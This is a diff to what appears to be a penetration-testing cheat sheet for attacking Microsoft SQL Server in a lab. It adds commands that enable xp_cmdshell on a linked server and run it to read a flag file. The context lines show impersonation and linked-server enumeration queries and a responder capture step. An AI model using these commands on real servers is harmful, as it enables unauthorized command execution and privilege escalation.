@@ -64,11 +64,15 @@ enable shell if it's disabled and we have rights:
 ```
 EXEC sp_configure 'show advanced options', 1;
 RECONFIGURE;
-sp_configure; - Enabling the sp_configure as stated in the above error message
+sp_configure;
 EXEC sp_configure 'xp_cmdshell', 1;
 RECONFIGURE;
 ```
-check role:
+or
+```sql
+EXECUTE('EXECUTE sp_configure ''show advanced options'', 1;RECONFIGURE;EXECUTE sp_configure ''xp_cmdshell'', 1;RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
+reconfigure
+go
 ```
 SELECT is_srvrolemember('sysadmin');
 ```
@@ -131,12 +135,8 @@ sudo responder -I tun0
 # Impersonate Existing Users with MSSQL
 #### Identify Users that We Can Impersonate
 ```sql
-1> SELECT distinct b.name
-2> FROM sys.server_permissions a
-3> INNER JOIN sys.server_principals b
-4> ON a.grantor_principal_id = b.principal_id
-5> WHERE a.permission_name = 'IMPERSONATE'
-6> GO
+1> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
+GO
 
 name
 -----------------------------------------------
@@ -180,6 +180,10 @@ sa
 
 (1 rows affected)
 ```
+#### Now perform RCE
+```sql
+EXECUTE('xp_cmdshell ''more c:\users\administrator\desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV]
+```
 # Communicate with Other Databases with MSSQL
 #### Identify linked Servers in MSSQL
 ```sql
@@ -203,5 +207,3 @@ DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote         
 
 (1 rows affected)
 ```
-
-
